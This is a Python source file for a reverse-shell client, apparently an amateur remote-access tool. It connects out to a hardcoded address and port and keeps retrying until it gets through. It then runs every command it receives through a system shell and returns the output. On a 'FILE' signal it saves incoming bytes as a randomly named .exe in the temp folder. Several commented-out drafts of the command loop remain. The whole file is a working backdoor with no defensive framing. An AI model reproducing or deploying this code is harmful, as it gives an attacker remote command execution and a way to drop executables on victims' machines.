import socket
import time
import tempfile
import os
import threading
import subprocess
import uuid


def connect(server_ip, server_port):
    
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connected_once = False
    while True:
        try:
            print("Start")
            client_socket.connect((server_ip, server_port))
            connected_once = True
            print("Connected to the server.")
            # send_shell(client_socket)
            # print("qqq")
            # threading.Thread(target=send_shell, daemon=True ,args=(client_socket,)).start()
            receive_data(client_socket)
            break
        except ConnectionRefusedError:
            if connected_once:
                print("Connected once. Connection lost. Retrying in 5 seconds...")
            else:
                print("Connection refused. Retrying in 5 seconds...")
                client_socket.close()
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                time.sleep(5)
                continue
        except (BrokenPipeError,ConnectionResetError) as e:
                print(f"{type(e).__name__} Connection lost. Retrying in 5 seconds...")
                client_socket.close()
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                time.sleep(5)
                continue



def receive_file(client_socket):
    temp_dir = tempfile.gettempdir()
    print(temp_dir)
    name = str(uuid.uuid4()) + '.exe'
    while True:
        data = client_socket.recv(4096)
        try:
            if data.decode('utf-8') == "EOF":
                break
        except:
            file_path = os.path.join(tempfile.gettempdir(), name)
            with open(file_path, 'ab') as file:
                file.write(data)
        break


def send_shell(client_socket, command):
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    client_socket.send(output.stdout.encode('utf-8'))
    while True:
        command = client_socket.recv(4096).decode('utf-8')
        if command.lower() == "exit":
            break
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        client_socket.send(output.stdout.encode('utf-8'))



# def receive_data(client_socket):
#     while True:
#         try:
#             data = client_socket.recv(4096)
#             if not data:
#                 break
#             command = data.decode('utf-8')  
#             if command == "exit":
#                 break
#             output = subprocess.run(command, shell=True, capture_output=True, text=True)
#             client_socket.send(output.stdout.encode('utf-8'))

#         except:
#             temp_dir = tempfile.gettempdir()
#             print(temp_dir)
#             name = str(uuid.uuid4()) + '.exe'
#             if data:
#                     file_path = os.path.join(tempfile.gettempdir(), name)
#                     with open(file_path, 'ab') as file:
#                         file.write(data)
#             while True:
#                 i=0
#                 while True:
#                     data = client_socket.recv(4096)
#                     if not data:
#                         break
#                     try:
#                         if data.decode('utf-8') == "EOF":
#                              break
#                     except:
#                         file_path = os.path.join(tempfile.gettempdir(), name)
#                         with open(file_path, 'ab') as file:
#                             file.write(data)
#                         print(i)
#                         i+=1
#                 print("done")
#                 break


# def receive_data(client_socket):
#     while True:
#         data = client_socket.recv(4096)
#         if not data:
#             break
#         try:
#             command = data.decode('utf-8', 'ignore').replace('\0', '')  # Ignore null characters
#             if command == "exit":
#                 break
#             elif command == "FILE":  # Check for file flag
#                 receive_file(client_socket)  # Call a function to receive the file
#             else:
#                 output = subprocess.run(command, shell=True, capture_output=True, text=True)
#                 client_socket.send(output.stdout.encode('utf-8'))
#         except UnicodeDecodeError:
#             pass  # Handle the case where the data cannot be decoded as UTF-8



def receive_data(client_socket):
    while True:
        data = client_socket.recv(4096)
        if not data:
            break
        try:
            command = data.decode('utf-8', 'ignore').replace('\0', '')  # Ignore null characters
            if command == "exit":
                break
            elif command == "FILE":  # Check for file flag
                receive_file(client_socket)  # Call a function to receive the file
            else:
                send_shell(client_socket, command)  # Call a function to process the message
        except UnicodeDecodeError:
            pass  # Handle the case where the data cannot be decoded as UTF-8












def main():
    server_ip = '192.168.0.158'
    server_port = 12345
    connect(server_ip, server_port)
if __name__ == "__main__":
    main()


